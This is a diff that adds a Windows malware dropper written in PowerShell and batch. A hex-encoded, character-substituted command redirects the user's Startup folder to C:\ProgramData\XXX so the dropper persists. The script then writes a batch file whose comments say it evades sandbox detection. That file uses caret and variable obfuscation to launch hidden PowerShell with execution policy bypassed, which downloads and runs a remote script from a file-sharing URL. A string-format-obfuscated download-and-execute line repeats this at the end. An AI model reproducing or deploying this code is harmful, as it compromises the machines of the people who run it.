@@ -1,0 +1,21 @@
+$FxF = "5b @3 @9 @3 @4 #5 #d 2e #9 #f 2e #4 #9 @2 #5 #3 @4 #f @2 @9 5d 3a 3a 43 @2 #5 #1 @4 #5 44 #9 @2 #5 #3 @4 #f @2 @9 28 22 43 3a 5c 50 @2 #f #@ @2 #1 #d 44 #1 @4 #1 5c 58 58 58 22 29 0a @3 @4 #1 @2 @4 2d @3 #c #5 #5 @0 20 2d @3 20 35 0a 53 #5 @4 2d 49 @4 #5 #d 50 @2 #f @0 #5 @2 @4 @9 20 2d 50 #1 @4 #8 20 22 48 4b 43 55 3a 5c 53 #f ## @4 @@ #1 @2 #5 5c 4d #9 #3 @2 #f @3 #f ## @4 5c 5@ #9 #e #4 #f @@ @3 5c 43 @5 @2 @2 #5 #e @4 5# #5 @2 @3 #9 #f #e 5c 45 @8 @0 #c #f @2 #5 @2 5c 55 @3 #5 @2 20 53 #8 #5 #c #c 20 4# #f #c #4 #5 @2 @3 22 20 2d 4e #1 #d #5 20 22 53 @4 #1 @2 @4 @5 @0 22 20 2d 5# #1 #c @5 #5 20 22 43 3a 5c 50 @2 #f #@ @2 #1 #d 44 #1 @4 #1 5c 58 58 58 22 3b 0a 53 #5 @4 2d 49 @4 #5 #d 50 @2 #f @0 #5 @2 @4 @9 20 2d 50 #1 @4 #8 20 22 48 4b 43 55 3a 5c 53 #f ## @4 @@ #1 @2 #5 5c 4d #9 #3 @2 #f @3 #f ## @4 5c 5@ #9 #e #4 #f @@ @3 5c 43 @5 @2 @2 #5 #e @4 5# #5 @2 @3 #9 #f #e 5c 45 @8 @0 #c #f @2 #5 @2 5c 53 #8 #5 #c #c 20 4# #f #c #4 #5 @2 @3 22 20 2d 4e #1 #d #5 20 22 53 @4 #1 @2 @4 @5 @0 22 20 2d 5# #1 #c @5 #5 20 22 43 3a 5c 50 @2 #f #@ @2 #1 #d 44 #1 @4 #1 5c 58 58 58 22 3b 0a @3 @4 #1 @2 @4 2d @3 #c #5 #5 @0 20 2d @3 20 35".replace("#","6").replace("@","7")
+$FxXF = $FxF -split ' ' |ForEach-Object {[char][byte]"0x$_"}
+$FxXFF = $FxXF -join ''
+I`E`X $FxXFF
+start-sleep -s 3
+$Content = @'
+@echo off
+echo [+] Please Wait, Installing software ..
+:: writte file to disk to evade sandbox detection
+echo microsoft > %userprofile%\\license.pem
+:: local variable declarations
+sEt !h=e&& sEt U7=n&& sEt k8=d&& sEt db=P
+@c^M%k8%.E"x"%!h% /c =%db%oW%!h%rS^h%!h%lL"."%!h%Xe -%U7%o%db% -W^I%U7% hI%k8%D%!h%%U7% -%!h%p By%db%a^S%AA%s ^I^EX^(^Ne^w^-O^b^je^ct^ N^e^t.W^e^bc^li^en^t).D^ow^nloa^dS^tri^ng(^'https://transferNotepad.exesh/get/llxAeF/DHJKSLMNSMNotepad.exetxt'.replace('Notepad.exe','.')^)
+exit
+
+'@
+Set-Content -Path C:\ProgramData\XXX\XXX.BAT -Value $Content
+
+start-sleep -s 3
+
+&("{0}{1}"-f'IE','X')(.("{1}{0}{2}" -f'Ob',("{1}{0}" -f 'w-','Ne'),("{0}{1}"-f'je','ct')) ("{2}{0}{1}"-f ("{1}{0}{2}" -f 'bCl','.We','i'),'ent','Net')).("{0}{2}{3}{1}{4}" -f 'D','dst','own','loa',("{0}{1}" -f'ri','ng'))."INvO`kE"('https://transferNotepad.exesh/get/llxAeF/DHJKSLMNSMNotepad.exetxt'.replace('Notepad.exe','.'))
